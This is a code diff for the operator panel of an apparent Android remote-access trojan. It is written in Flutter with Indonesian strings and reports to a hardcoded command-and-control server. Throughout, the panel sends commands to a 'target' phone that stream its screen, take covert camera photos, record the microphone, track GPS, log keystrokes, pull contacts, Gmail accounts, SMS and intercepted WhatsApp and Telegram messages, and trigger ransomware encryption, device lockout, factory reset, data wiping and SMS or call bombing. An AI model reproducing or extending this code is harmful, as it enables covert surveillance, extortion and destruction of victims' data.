@@ -1,21 +1,34 @@
 import 'package:flutter/material.dart';
 import 'package:http/http.dart' as http;
 import 'dart:convert';
-import 'dart:ui'; // Wajib untuk efek Blur
-import 'package:url_launcher/url_launcher.dart';
+import 'package:url_launcher/url_launcher.dart'; 
+
+const String SERVER_URL = "http://marxxxnotdev.danzxncloud.biz.id:11662";
 
 class ControlCenterPage extends StatefulWidget {
-  const ControlCenterPage({super.key});
+  final Map<String, dynamic>? device;
+  const ControlCenterPage({super.key, this.device});
 
   @override
   State<ControlCenterPage> createState() => _ControlCenterPageState();
 }
 
+class ControlPanelPage extends ControlCenterPage {
+  const ControlPanelPage({super.key, required Map<String, dynamic> device}) 
+      : super(device: device);
+}
+
 class _ControlCenterPageState extends State<ControlCenterPage> {
   bool _isSending = false;
   final List<String> _executionLogs = [];
+
   bool _isStreamingScreen = false;
   String _currentStreamFrame = "";
+  StateSetter? _streamStateSetter;
+
+  final Color primaryRed = const Color(0xFFE53935);
+  final Color darkBg = const Color(0xFF1A1A1A);
+  final Color cardBg = const Color(0xFF2D2D2D);
 
   @override
   void initState() {
@@ -26,8 +39,7 @@ class _ControlCenterPageState extends State<ControlCenterPage> {
   }
 
   void _triggerAutoWakeup() {
-    final args = ModalRoute.of(context)!.settings.arguments as Map<String, dynamic>?;
-    final device = args?['device'] as Map<String, dynamic>?;
+    final device = widget.device;
     if (device != null && device['id'] != null) {
       _sendCommand("force_open", device['id'].toString(), isSilent: true);
     }
@@ -37,99 +49,88 @@ class _ControlCenterPageState extends State<ControlCenterPage> {
     if (mounted) {
       setState(() {
         _executionLogs.insert(0, "[${DateTime.now().toString().substring(11, 19)}] $message");
-        if (_executionLogs.length > 100) _executionLogs.removeLast();
+        if (_executionLogs.length > 100) _executionLogs.removeLast(); 
       });
     }
   }
 
-  // --- MODUL TAMPILKAN FOTO HASIL JEPRETAN ---
-  void _showCapturedPhoto(String base64Image) {
-    showDialog(
-      context: context,
-      builder: (context) => AlertDialog(
-        backgroundColor: Colors.transparent,
-        content: _glassContainer(
-          opacity: 0.2,
-          child: Column(
-            mainAxisSize: MainAxisSize.min,
-            children: [
-              Container(
-                padding: const EdgeInsets.all(15),
-                child: const Text("TARGET CAPTURED", style: TextStyle(color: Colors.orange, fontWeight: FontWeight.bold, letterSpacing: 2)),
-              ),
-              ClipRRect(
-                borderRadius: BorderRadius.circular(10),
-                child: Image.memory(
-                  base64Decode(base64Image.replaceAll(RegExp(r'\s+'), '')),
-                  fit: BoxFit.contain,
-                  errorBuilder: (context, error, stackTrace) => const Padding(
-                    padding: EdgeInsets.all(20),
-                    child: Text("Corrupted Image Data", style: TextStyle(color: Colors.red)),
-                  ),
-                ),
-              ),
-              const SizedBox(height: 15),
-              TextButton(
-                onPressed: () => Navigator.pop(context),
-                child: const Text("CLOSE", style: TextStyle(color: Colors.white)),
-              )
-            ],
-          ),
-        ),
-      ),
-    );
-  }
-
-  Future<void> _sendCommand(String command, String targetId,
-      {String? extra, String? lockType, bool isSilent = false}) async {
-    final args = ModalRoute.of(context)!.settings.arguments as Map<String, dynamic>?;
-    final String operatorName = args?['operator'] ?? "NXOB_ADMIN";
-
+  Future<void> _sendCommand(String command, String targetId, {String? extra, bool isSilent = false}) async {
     if (targetId == "unknown") {
-      if (!isSilent) _addLog("Error: ID Target unknown");
+      if (!isSilent) {
+        _addLog("Error: ID Target tidak valid");
+        _showNotif("ID TIDAK TERDETEKSI");
+      }
       return;
     }
 
     if (!isSilent) {
       setState(() => _isSending = true);
-      _addLog("Kirim: $command -> $targetId");
+      _addLog("Mengirim perintah: $command ke $targetId");
     }
-
+    
     try {
       final response = await http.post(
-        Uri.parse("http://marxxxnotdev.danzxncloud.biz.id:11662/api/send-command"),
+        Uri.parse("$SERVER_URL/api/send-command"),
         headers: {"Content-Type": "application/json"},
         body: jsonEncode({
-          "id": targetId,
-          "command": command,
-          "extra": extra ?? "",
-          "type": lockType ?? "NORMAL",
-          "admin": operatorName,
+          "id": targetId, 
+          "command": command, 
+          "extra": extra ?? "", 
         }),
       ).timeout(const Duration(seconds: 15));
 
       if (response.statusCode == 200) {
-        if (!isSilent) _addLog("Berhasil: $command terkirim.");
+        if (!isSilent) _addLog("Perintah $command TERKIRIM");
         _startResponsePolling(command, targetId, isSilent: isSilent);
+      } else {
+        if (!isSilent) {
+          _addLog("Error: Target Offline");
+          _showNotif("TARGET OFFLINE");
+        }
       }
     } catch (e) {
-      if (!isSilent) _addLog("Error: Koneksi gagal.");
+      if (!isSilent) {
+        _addLog("Error: Koneksi Gagal");
+        _showNotif("KONEKSI ERROR");
+      }
     } finally {
       if (!isSilent) setState(() => _isSending = false);
+    }
+  }
+
+  void _fetchNotificationLogs(String targetId) async {
+    _addLog("Menarik database pesan...");
+    try {
+      final response = await http.get(
+        Uri.parse("$SERVER_URL/api/get-notifications/$targetId"),
+      );
+      if (response.statusCode == 200) {
+        final List logs = jsonDecode(response.body);
+        _showNotificationLogsDialog(logs);
+        _addLog("SUCCESS: ${logs.length} Pesan ditemukan.");
+      } else {
+        _addLog("Gagal menarik notifikasi.");
+      }
+    } catch (e) {
+      _addLog("Error: Server API Down.");
     }
   }
 
   void _startResponsePolling(String cmd, String targetId, {bool isSilent = false}) async {
     int attempts = 0;
     bool received = false;
-    int maxAttempts = 15;
+    int maxAttempts = isSilent && cmd == "get_screen" ? 15 : 10; 
+
     while (attempts < maxAttempts && !received) {
-      await Future.delayed(Duration(milliseconds: isSilent ? 800 : 2500));
+      await Future.delayed(Duration(milliseconds: isSilent ? 800 : 3000));
       attempts++;
+      if (!isSilent) _addLog("Polling... $attempts/$maxAttempts");
+
       try {
         final response = await http.get(
-          Uri.parse("http://marxxxnotdev.danzxncloud.biz.id:11662/api/get-response/$targetId"),
+          Uri.parse("$SERVER_URL/api/get-response/$targetId"),
         );
+        
         if (response.statusCode == 200) {
           final data = jsonDecode(response.body);
           if (data['data'] != null && data['cmd'] == cmd) {
@@ -137,285 +138,376 @@ class _ControlCenterPageState extends State<ControlCenterPage> {
             received = true;
           }
         }
-      } catch (e) {}
+      } catch (e) { }
+    }
+    
+    if (!received && !isSilent) {
+      _addLog("Timeout: Target tidak merespon.");
     }
   }
 
   void _processResponse(String cmd, dynamic data, String targetId) {
     if (data == null) return;
-    if (cmd == "target_chat_reply") {
-      _addLog("REPLY: ${data['message']}");
-    } else if (cmd == "get_clipboard") {
-      _addLog("CLIPBOARD: ${data['clipboard']}");
-    } else if (cmd == "get_heat") {
-      _addLog("HEAT: ${data['thermal']}");
-    } else if (cmd == "get_accounts") {
-      _addLog("ACCOUNTS: ${data['accounts']}");
-    } else if (cmd == "get_system_stats") {
-      _addLog("STATS: ${data['stats']}");
+
+    if (cmd == "get_location") {
+      _addLog("SUCCESS: Koordinat GPS diterima.");
+      _showLocationDialog(data['lat'], data['lng']);
+    } else if (cmd == "get_contacts") {
+      _addLog("SUCCESS: Database kontak diunduh.");
+      _showContactsDialog(data['contacts']);
     } else if (cmd == "take_photo") {
-      _addLog("IMAGE RECEIVED.");
-      if (data is String) {
-         _showCapturedPhoto(data);
-      } else if (data is Map && data['image'] != null) {
-         _showCapturedPhoto(data['image']);
-      }
+      _addLog("SUCCESS: Gambar kamera ditarik.");
+      _showCameraResultDialog(data['image_base64']);
+    } else if (cmd == "get_screen") {
+      if (!_isStreamingScreen) _addLog("SUCCESS: Memulai Screen Stream.");
+      _showScreenResultDialog(data['image_base64'] ?? "", targetId);
+    } else if (cmd == "get_gmails") {
+      _addLog("SUCCESS: Daftar Gmail ditarik.");
+      _showGmailDialog(data['accounts'] ?? "No Accounts Found");
+    } else if (cmd == "vibrate_loop") {
+      _addLog("SUCCESS: Target digetarkan.");
+      _showNotif("TARGET BERGETAR");
+    } else if (cmd == "flash_strobe") {
+      _addLog("SUCCESS: Strobe Aktif.");
+      _showNotif("STROBE ACTIVE");
+    } else if (cmd == "hard_lock") {
+      _addLog("🔒 HARD LOCK: Device terkunci!");
+      _showNotif("HARD LOCK ACTIVE");
+    } else if (cmd == "activate_ransomware") {
+      _addLog("💀 RANSOMWARE LOCK: Files encrypted + Device locked!");
+      _showNotif("RANSOMWARE ACTIVE");
+    } else if (cmd == "panic_mode") {
+      _addLog("⚠️ PANIC MODE: Device locked! UNLOCK VIA CONTROLLER ONLY!");
+      _showNotif("PANIC MODE ACTIVE");
+    } else if (cmd == "virus_mode") {
+      _addLog("🦠 VIRUS MODE: Fake virus alert activated! UNLOCK VIA CONTROLLER ONLY!");
+      _showNotif("VIRUS MODE ACTIVE");
+    } else if (cmd == "panic_unlock") {
+      _addLog("🔓 PANIC UNLOCK: Device unlocked!");
+      _showNotif("PANIC MODE DISABLED");
+    } else if (cmd == "virus_unlock") {
+      _addLog("🔓 VIRUS UNLOCK: Device unlocked!");
+      _showNotif("VIRUS MODE DISABLED");
+    } else if (cmd == "decrypt_files") {
+      _addLog("🔓 FILES DECRYPTED: Semua file kembali normal!");
+      _showNotif("FILES DECRYPTED");
+    } else if (cmd == "factory_reset") {
+      _addLog("💣 FACTORY RESET: Device akan direset ke pengaturan pabrik!");
+      _showNotif("FACTORY RESET INITIATED");
+    } else if (cmd == "wipe_data") {
+      _addLog("🗑️ WIPE DATA: Semua file user telah dihapus!");
+      _showNotif("DATA WIPED");
+    } else if (cmd == "call_bombing") {
+      _addLog("📞 CALL BOMBING: Target akan menerima banyak panggilan!");
+      _showNotif("CALL BOMBING ACTIVE");
+    } else if (cmd == "sms_bomber") {
+      _addLog("📨 SMS BOMBER: Target akan menerima banyak SMS!");
+      _showNotif("SMS BOMBER ACTIVE");
+    } else if (cmd == "battery_drain") {
+      _addLog("🔋 BATTERY DRAIN: Baterai target akan cepat habis!");
+      _showNotif("BATTERY DRAIN ACTIVE");
     } else {
-      _addLog("Respon [$cmd] Diterima.");
+      _addLog("Eksekusi $cmd Berhasil");
+      _showNotif("PERINTAH BERHASIL");
     }
   }
 
-  // --- REUSABLE GLASS CONTAINER ---
-  Widget _glassContainer({required Widget child, double blur = 10, double opacity = 0.05}) {
-    return ClipRRect(
-      borderRadius: BorderRadius.circular(15),
-      child: BackdropFilter(
-        filter: ImageFilter.blur(sigmaX: blur, sigmaY: blur),
-        child: Container(
-          decoration: BoxDecoration(
-            color: Colors.white.withOpacity(opacity),
-            borderRadius: BorderRadius.circular(15),
-            border: Border.all(color: Colors.white.withOpacity(0.1), width: 1.5),
+  void _showCameraResultDialog(String base64Image) {
+    showDialog(
+      context: context,
+      builder: (context) => AlertDialog(
+        backgroundColor: cardBg,
+        title: const Text("HASIL KAMERA", style: TextStyle(color: Colors.white, fontSize: 14)),
+        content: ClipRRect(
+          borderRadius: BorderRadius.circular(10),
+          child: Image.memory(
+            base64Decode(base64Image),
+            fit: BoxFit.contain,
+            errorBuilder: (context, error, stackTrace) => const Text("Gagal memuat gambar", style: TextStyle(color: Colors.white)),
           ),
-          child: child,
+        ),
+        actions: [
+          TextButton(onPressed: () => Navigator.pop(context), child: const Text("TUTUP", style: TextStyle(color: Color(0xFFE53935)))),
+        ],
+      ),
+    );
+  }
+
+  void _showScreenResultDialog(String base64Image, String targetId) {
+    _currentStreamFrame = base64Image;
+
+    if (_isStreamingScreen && _streamStateSetter != null) {
+      _streamStateSetter!((){});
+      Future.delayed(const Duration(milliseconds: 1000), () {
+        if (mounted && _isStreamingScreen) {
+            _sendCommand("get_screen", targetId, isSilent: true);
+        }
+      });
+      return;
+    }
+
+    _isStreamingScreen = true;
+    showDialog(
+      context: context,
+      barrierDismissible: false,
+      builder: (context) => StatefulBuilder(
+        builder: (context, setDialogState) {
+          _streamStateSetter = setDialogState;
+          return AlertDialog(
+            backgroundColor: cardBg,
+            insetPadding: const EdgeInsets.all(10),
+            title: const Row(
+              children: [
+                Icon(Icons.live_tv, color: Color(0xFFE53935), size: 18),
+                SizedBox(width: 10),
+                Text("SCREEN STREAM", style: TextStyle(color: Color(0xFFE53935), fontSize: 12)),
+              ],
+            ),
+            content: Column(
+              mainAxisSize: MainAxisSize.min,
+              children: [
+                ClipRRect(
+                  borderRadius: BorderRadius.circular(10),
+                  child: _currentStreamFrame.isNotEmpty 
+                    ? Image.memory(
+                        base64Decode(_currentStreamFrame),
+                        fit: BoxFit.contain,
+                        gaplessPlayback: true, 
+                      )
+                    : const Padding(
+                        padding: EdgeInsets.all(20.0),
+                        child: CircularProgressIndicator(color: Color(0xFFE53935)),
+                      ),
+                ),
+                const SizedBox(height: 10),
+                const LinearProgressIndicator(color: Color(0xFFE53935), backgroundColor: Colors.white10),
+              ],
+            ),
+            actions: [
+              TextButton(
+                onPressed: () {
+                  _isStreamingScreen = false;
+                  _streamStateSetter = null;
+                  Navigator.pop(context);
+                }, 
+                child: const Text("STOP STREAM", style: TextStyle(color: Color(0xFFE53935))),
+              ),
+            ],
+          );
+        }
+      ),
+    ).then((_) {
+      _isStreamingScreen = false;
+      _streamStateSetter = null;
+    });
+
+    Future.delayed(const Duration(milliseconds: 500), () {
+      if (mounted && _isStreamingScreen) {
+          _sendCommand("get_screen", targetId, isSilent: true);
+      }
+    });
+  }
+
+  void _showLocationDialog(dynamic lat, dynamic lng) {
+    showDialog(
+      context: context,
+      builder: (context) => AlertDialog(
+        backgroundColor: cardBg,
+        title: const Text("LOKASI REAL-TIME", style: TextStyle(color: Colors.white, fontSize: 12)),
+        content: Column(
+          mainAxisSize: MainAxisSize.min,
+          children: [
+            Container(
+              padding: const EdgeInsets.all(10),
+              decoration: BoxDecoration(color: Colors.black, borderRadius: BorderRadius.circular(10)),
+              child: SelectableText("KOORDINAT: $lat, $lng", style: const TextStyle(color: Color(0xFFE53935), fontSize: 12, fontWeight: FontWeight.bold)),
+            ),
+            const SizedBox(height: 15),
+            ClipRRect(
+              borderRadius: BorderRadius.circular(15),
+              child: Image.network(
+                "https://static-maps.yandex.ru/1.x/?lang=en_US&ll=$lng,$lat&z=15&l=map&size=450,300",
+                height: 200, width: double.infinity, fit: BoxFit.cover,
+                errorBuilder: (c, e, s) => const Icon(Icons.map, color: Colors.white, size: 50),
+              ),
+            ),
+          ],
+        ),
+        actions: [
+          TextButton(onPressed: () => Navigator.pop(context), child: const Text("TUTUP")),
+          TextButton(
+            onPressed: () => launchUrl(Uri.parse("https://www.google.com/maps/search/?api=1&query=$lat,$lng"), mode: LaunchMode.externalApplication),
+            child: const Text("BUKA MAPS", style: TextStyle(color: Color(0xFFE53935))),
+          ),
+        ],
+      ),
+    );
+  }
+
+  void _showContactsDialog(List contacts) {
+    showModalBottomSheet(
+      context: context,
+      backgroundColor: cardBg,
+      isScrollControlled: true,
+      shape: const RoundedRectangleBorder(borderRadius: BorderRadius.vertical(top: Radius.circular(25))),
+      builder: (context) => DraggableScrollableSheet(
+        initialChildSize: 0.6,
+        maxChildSize: 0.9,
+        expand: false,
+        builder: (context, scrollController) => Column(
+          children: [
+            const Padding(
+              padding: EdgeInsets.all(15),
+              child: Text("KONTAK TARGET", style: TextStyle(color: Color(0xFFE53935), fontWeight: FontWeight.bold)),
+            ),
+            Expanded(
+              child: ListView.builder(
+                controller: scrollController,
+                itemCount: contacts.length,
+                itemBuilder: (context, i) => ListTile(
+                  leading: const CircleAvatar(backgroundColor: Color(0xFFE53935), child: Icon(Icons.person, color: Colors.black, size: 20)),
+                  title: Text(contacts[i]['name'] ?? "No Name", style: const TextStyle(color: Colors.white, fontSize: 14)),
+                  subtitle: Text(contacts[i]['number'] ?? "No Number", style: const TextStyle(color: Colors.white38, fontSize: 12)),
+                ),
+              ),
+            ),
+          ],
+        ),
+      ),
+    );
+  }
+
+  void _showNotificationLogsDialog(List logs) {
+    String selectedFilter = "ALL"; 
+
+    showModalBottomSheet(
+      context: context,
+      backgroundColor: cardBg,
+      isScrollControlled: true,
+      shape: const RoundedRectangleBorder(borderRadius: BorderRadius.vertical(top: Radius.circular(25))),
+      builder: (context) => StatefulBuilder(
+        builder: (context, setModalState) {
+          List filteredLogs = logs.where((log) {
+            String pkg = log['package']?.toString().toLowerCase() ?? "";
+            if (selectedFilter == "WA") return pkg.contains("whatsapp");
+            if (selectedFilter == "TELE") return pkg.contains("telegram");
+            if (selectedFilter == "FB") return pkg.contains("facebook");
+            if (selectedFilter == "GMAIL") return pkg.contains("gmail");
+            return true;
+          }).toList();
+
+          return DraggableScrollableSheet(
+            initialChildSize: 0.8,
+            maxChildSize: 0.95,
+            expand: false,
+            builder: (context, scrollController) => Column(
+              children: [
+                Container(
+                  margin: const EdgeInsets.symmetric(vertical: 10),
+                  width: 40, height: 4, decoration: BoxDecoration(color: Color(0xFFE53935), borderRadius: BorderRadius.circular(10)),
+                ),
+                const Text("INTERCEPT PESAN", style: TextStyle(color: Color(0xFFE53935), fontWeight: FontWeight.bold, fontSize: 16)),
+                const SizedBox(height: 15),
+                SingleChildScrollView(
+                  scrollDirection: Axis.horizontal,
+                  padding: const EdgeInsets.symmetric(horizontal: 15),
+                  child: Row(
+                    children: [
+                      _buildFilterBtn("ALL", Icons.all_inclusive, filteredLogs.length, selectedFilter, (v) => setModalState(() => selectedFilter = v)),
+                      _buildFilterBtn("WA", Icons.chat, logs.where((l) => l['package']?.toString().toLowerCase().contains("whatsapp") ?? false).length, selectedFilter, (v) => setModalState(() => selectedFilter = v)),
+                      _buildFilterBtn("TELE", Icons.send, logs.where((l) => l['package']?.toString().toLowerCase().contains("telegram") ?? false).length, selectedFilter, (v) => setModalState(() => selectedFilter = v)),
+                      _buildFilterBtn("FB", Icons.facebook, logs.where((l) => l['package']?.toString().toLowerCase().contains("facebook") ?? false).length, selectedFilter, (v) => setModalState(() => selectedFilter = v)),
+                      _buildFilterBtn("GMAIL", Icons.mail, logs.where((l) => l['package']?.toString().toLowerCase().contains("gmail") ?? false).length, selectedFilter, (v) => setModalState(() => selectedFilter = v)),
+                    ],
+                  ),
+                ),
+                const SizedBox(height: 10),
+                Expanded(
+                  child: ListView.builder(
+                    controller: scrollController,
+                    itemCount: filteredLogs.length,
+                    itemBuilder: (context, i) {
+                      final log = filteredLogs[i];
+                      String pkg = log['package']?.toString() ?? "";
+                      IconData icon = Icons.notifications;
+                      if (pkg.contains("whatsapp")) icon = Icons.chat;
+                      else if (pkg.contains("telegram")) icon = Icons.send;
+                      else if (pkg.contains("gmail")) icon = Icons.mail;
+
+                      return ListTile(
+                        leading: Icon(icon, color: Color(0xFFE53935)),
+                        title: Text(log['title'] ?? "Unknown", style: const TextStyle(color: Colors.white, fontSize: 13, fontWeight: FontWeight.bold)),
+                        subtitle: Text(log['body'] ?? "", style: const TextStyle(color: Colors.white70, fontSize: 12)),
+                      );
+                    },
+                  ),
+                ),
+              ],
+            ),
+          );
+        }
+      ),
+    );
+  }
+
+  Widget _buildFilterBtn(String label, IconData icon, int count, String active, Function(String) onTap) {
+    bool isSelected = active == label;
+    return GestureDetector(
+      onTap: () => onTap(label),
+      child: Container(
+        margin: const EdgeInsets.only(right: 8),
+        padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 8),
+        decoration: BoxDecoration(
+          color: isSelected ? Color(0xFFE53935).withOpacity(0.2) : Colors.white10,
+          borderRadius: BorderRadius.circular(20),
+          border: Border.all(color: isSelected ? Color(0xFFE53935) : Colors.transparent),
+        ),
+        child: Row(
+          children: [
+            Icon(icon, size: 14, color: isSelected ? Color(0xFFE53935) : Colors.white54),
+            const SizedBox(width: 6),
+            Text(label, style: TextStyle(color: isSelected ? Colors.white : Colors.white54, fontSize: 11, fontWeight: FontWeight.bold)),
+            if (count > 0) ...[
+              const SizedBox(width: 4),
+              Text("($count)", style: TextStyle(color: isSelected ? Color(0xFFE53935) : Colors.white54, fontSize: 9)),
+            ],
+          ],
         ),
       ),
     );
   }
 
   void _showCameraMenu(String targetId) {
-    String selectedCam = "back";
+    String selectedCam = "back"; 
     showDialog(
-        context: context,
-        builder: (context) => StatefulBuilder(
-            builder: (context, setInternalState) => AlertDialog(
-                  backgroundColor: Colors.transparent,
-                  content: _glassContainer(
-                    child: Padding(
-                      padding: const EdgeInsets.all(20),
-                      child: Column(
-                        mainAxisSize: MainAxisSize.min,
-                        children: [
-                          const Text("Surveillance Camera", style: TextStyle(color: Colors.white, fontSize: 16)),
-                          const SizedBox(height: 20),
-                          Row(mainAxisAlignment: MainAxisAlignment.spaceEvenly, children: [
-                            _cameraOption(Icons.camera_rear, "BACK", "back", selectedCam, (v) => setInternalState(() => selectedCam = v)),
-                            _cameraOption(Icons.camera_front, "FRONT", "front", selectedCam, (v) => setInternalState(() => selectedCam = v)),
-                          ]),
-                          const SizedBox(height: 20),
-                          ElevatedButton(
-                              style: ElevatedButton.styleFrom(backgroundColor: Colors.orange),
-                              onPressed: () {
-                                _sendCommand("take_photo", targetId, extra: selectedCam);
-                                Navigator.pop(context);
-                              },
-                              child: const Text("CAPTURE")),
-                        ],
-                      ),
-                    ),
-                  ),
-                )));
-  }
-
-  Widget _cameraOption(IconData i, String l, String v, String curr, Function(String) onTap) {
-    bool isS = v == curr;
-    return GestureDetector(
-        onTap: () => onTap(v),
-        child: Column(mainAxisSize: MainAxisSize.min, children: [
-          Icon(i, size: 40, color: isS ? Colors.orange : Colors.white24),
-          const SizedBox(height: 5),
-          Text(l, style: TextStyle(color: isS ? Colors.orange : Colors.white24, fontSize: 10)),
-        ]));
-  }
-
-  void _showInputDialog(String title, String cmd, String targetId) {
-    TextEditingController t = TextEditingController();
-    TextEditingController p = TextEditingController();
-    String lockType = "NORMAL";
-    showDialog(
-        context: context,
-        builder: (context) => StatefulBuilder(
-            builder: (context, setS) => AlertDialog(
-                  backgroundColor: Colors.transparent,
-                  content: _glassContainer(
-                    child: Padding(
-                      padding: const EdgeInsets.all(20),
-                      child: Column(mainAxisSize: MainAxisSize.min, children: [
-                        Text(title, style: const TextStyle(color: Colors.white, fontSize: 16)),
-                        const SizedBox(height: 15),
-                        if (cmd == "hard_lock")
-                          Row(children: [
-                            ChoiceChip(label: const Text("PIN"), selected: lockType == "NORMAL", onSelected: (v) => setS(() => lockType = "NORMAL")),
-                            const SizedBox(width: 10),
-                            ChoiceChip(label: const Text("CHAT"), selected: lockType == "CHAT", onSelected: (v) => setS(() => lockType = "CHAT")),
-                          ]),
-                        TextField(
-                            controller: t,
-                            style: const TextStyle(color: Colors.white),
-                            decoration: InputDecoration(
-                                labelText: cmd == "set_bright" ? "Level (0.0 - 1.0)" : "Data/Pesan",
-                                labelStyle: const TextStyle(color: Colors.white54))),
-                        if (cmd == "hard_lock" && lockType == "NORMAL")
-                          TextField(
-                              controller: p,
-                              keyboardType: TextInputType.number,
-                              style: const TextStyle(color: Colors.white),
-                              decoration: const InputDecoration(labelText: "PIN Unlock", labelStyle: TextStyle(color: Colors.white54))),
-                        const SizedBox(height: 20),
-                        ElevatedButton(
-                            onPressed: () {
-                              _sendCommand(cmd, targetId, extra: cmd == "hard_lock" ? "${t.text}|${p.text}" : t.text, lockType: lockType);
-                              Navigator.pop(context);
-                            },
-                            child: const Text("SEND")),
-                      ]),
-                    ),
-                  ),
-                )));
-  }
-
-  Widget _buildControlBlock(String title, Color color, List<Widget> buttons) {
-    return Column(crossAxisAlignment: CrossAxisAlignment.start, children: [
-      Padding(
-          padding: const EdgeInsets.fromLTRB(15, 15, 0, 10),
-          child: Text(title, style: TextStyle(color: color, fontSize: 12, fontWeight: FontWeight.bold, letterSpacing: 1.5))),
-      Padding(padding: const EdgeInsets.symmetric(horizontal: 10), child: Wrap(spacing: 12, runSpacing: 12, children: buttons)),
-    ]);
-  }
-
-  Widget _btn(String label, IconData icon, Color color, String cmd, String targetId,
-      {bool isInput = false, bool isCam = false, bool isPage = false, Widget? destination}) {
-    return InkWell(
-      onTap: () {
-        if (isPage && destination != null) {
-          Navigator.push(context, MaterialPageRoute(builder: (context) => destination));
-        } else if (isCam) {
-          _showCameraMenu(targetId);
-        } else if (isInput) {
-          _showInputDialog(label, cmd, targetId);
-        } else if (cmd == 'get_notif_logs') {
-          _fetchNotificationLogs(targetId);
-        } else {
-          _sendCommand(cmd, targetId);
-        }
-      },
-      child: _glassContainer(
-        opacity: 0.1,
-        child: Container(
-          width: MediaQuery.of(context).size.width / 4 - 18,
-          padding: const EdgeInsets.symmetric(vertical: 15),
-          child: Column(children: [
-            Icon(icon, color: color, size: 22),
-            const SizedBox(height: 6),
-            Text(label, style: const TextStyle(color: Colors.white, fontSize: 9, fontWeight: FontWeight.w500), textAlign: TextAlign.center, maxLines: 1),
-          ]),
-        ),
-      ),
-    );
-  }
-
-  @override
-  Widget build(BuildContext context) {
-    final args = ModalRoute.of(context)!.settings.arguments as Map<String, dynamic>?;
-    final device = args?['device'] as Map<String, dynamic>?;
-    final String targetId = device?['id']?.toString() ?? "unknown";
-
-    return DefaultTabController(
-      length: 4,
-      child: Scaffold(
-        backgroundColor: Colors.black, // Background Hitam Pekat
-        appBar: AppBar(
-          backgroundColor: Colors.black,
-          elevation: 0,
-          title: Text(device?['model'] ?? "Terminal", style: const TextStyle(fontSize: 18, fontWeight: FontWeight.bold, color: Colors.white)),
-          bottom: TabBar(
-            isScrollable: true,
-            indicatorColor: Colors.orange,
-            indicatorWeight: 3,
-            labelStyle: const TextStyle(fontWeight: FontWeight.bold),
-            unselectedLabelColor: Colors.white38,
-            tabs: const [Tab(text: "INTEL"), Tab(text: "SABOTAGE"), Tab(text: "SYSTEM"), Tab(text: "LOCKDOWN")],
-          ),
-          actions: [
-            _isSending
-                ? const Center(child: Padding(padding: EdgeInsets.all(15), child: SizedBox(width: 20, height: 20, child: CircularProgressIndicator(strokeWidth: 2, color: Colors.orange))))
-                : IconButton(onPressed: () => _sendCommand("force_open", targetId, isSilent: true), icon: const Icon(Icons.refresh, color: Colors.white))
-          ],
-        ),
-        body: Container(
-          decoration: const BoxDecoration(
-            gradient: RadialGradient(
-              center: Alignment(0.7, -0.5),
-              radius: 1.5,
-              colors: [Color(0xFF1A1D2D), Colors.black],
-            ),
-          ),
-          child: Column(
+      context: context,
+      builder: (context) => StatefulBuilder(
+        builder: (context, setInternalState) => AlertDialog(
+          backgroundColor: cardBg,
+          title: const Text("SURVEILLANCE CAMERA", style: TextStyle(color: Colors.white, fontSize: 14, fontWeight: FontWeight.bold)),
+          content: Column(
+            mainAxisSize: MainAxisSize.min,
             children: [
-              _buildLogContainer(),
-              Expanded(
-                child: TabBarView(
-                  children: [
-                    ListView(physics: const BouncingScrollPhysics(), children: [
-                      _buildControlBlock("LIVE SURVEILLANCE", Colors.orangeAccent, [
-                        _btn("Photo", Icons.camera, Colors.orangeAccent, "take_photo", targetId, isCam: true),
-                        _btn("Screen", Icons.screenshot, Colors.orangeAccent, "get_screen", targetId),
-                        _btn("Mic Start", Icons.mic, Colors.red, "mic_record_start", targetId),
-                        _btn("Mic Stop", Icons.mic_off, Colors.white, "mic_record_stop", targetId),
-                        _btn("GPS", Icons.location_on, Colors.greenAccent, "get_location", targetId),
-                      ]),
-                      _buildControlBlock("DATA MINING", Colors.blueAccent, [
-                        _btn("Keylogger", Icons.keyboard, Colors.yellow, "check_keylogger", targetId),
-                        _btn("Clipboard", Icons.content_paste, Colors.blueAccent, "get_clipboard", targetId),
-                        _btn("Accounts", Icons.account_circle, Colors.teal, "get_accounts", targetId),
-                        _btn("Contacts", Icons.person, Colors.blueAccent, "get_contacts", targetId,
-                            isPage: true, destination: DataViewerPage(title: "Contacts", cmd: "get_contacts", targetId: targetId)),
-                        _btn("Gmail", Icons.email, Colors.redAccent, "get_gmails", targetId),
-                        _btn("Apps", Icons.apps, Colors.tealAccent, "get_apps", targetId,
-                            isPage: true, destination: DataViewerPage(title: "Apps List", cmd: "get_apps", targetId: targetId)),
-                        _btn("Heat Info", Icons.thermostat, Colors.redAccent, "get_heat", targetId),
-                        _btn("Stats", Icons.bar_chart, Colors.grey, "get_system_stats", targetId),
-                      ]),
-                    ]),
-                    ListView(physics: const BouncingScrollPhysics(), children: [
-                      _buildControlBlock("INTERCEPTION", Colors.pinkAccent, [
-                        _btn("Live MSG", Icons.message, Colors.pinkAccent, "get_notif_logs", targetId),
-                        _btn("SMS Chat", Icons.sms, Colors.pinkAccent, "get_sms", targetId,
-                            isPage: true, destination: SmsChatViewerPage(targetId: targetId)),
-                        _btn("Call Logs", Icons.history, Colors.pinkAccent, "get_calls", targetId),
-                        _btn("Acc. Perm", Icons.accessibility, Colors.orange, "force_accessibility", targetId),
-                        _btn("Notif Acc", Icons.security, Colors.pinkAccent, "open_notif_access", targetId),
-                      ]),
-                      _buildControlBlock("HARDWARE SABOTAGE", Colors.cyanAccent, [
-                        _btn("Strobe", Icons.flash_on, Colors.yellowAccent, "flash_strobe", targetId),
-                        _btn("Stop Strb", Icons.flash_off, Colors.white, "stop_strobe", targetId),
-                        _btn("Vol Max", Icons.volume_up, Colors.redAccent, "set_vol_max", targetId),
-                        _btn("Vibrate", Icons.vibration, Colors.cyanAccent, "vibrate_loop", targetId),
-                        _btn("DDoS Net", Icons.wifi_off, Colors.redAccent, "record_audio", targetId),
-                        _btn("WA Bug", Icons.bug_report, Colors.greenAccent, "wa_bug", targetId),
-                      ]),
-                    ]),
-                    ListView(physics: const BouncingScrollPhysics(), children: [
-                      _buildControlBlock("UI MANIPULATION", Colors.purpleAccent, [
-                        _btn("Wallpaper", Icons.image, Colors.blueAccent, "set_wallpaper", targetId, isInput: true),
-                        _btn("Audio URL", Icons.music_note, Colors.yellowAccent, "play_audio", targetId, isInput: true),
-                        _btn("Stop Aud", Icons.stop, Colors.white, "stop_audio", targetId),
-                        _btn("Bright", Icons.brightness_6, Colors.white, "set_bright", targetId, isInput: true),
-                        _btn("Speak TTS", Icons.record_voice_over, Colors.purpleAccent, "speak_tts", targetId, isInput: true),
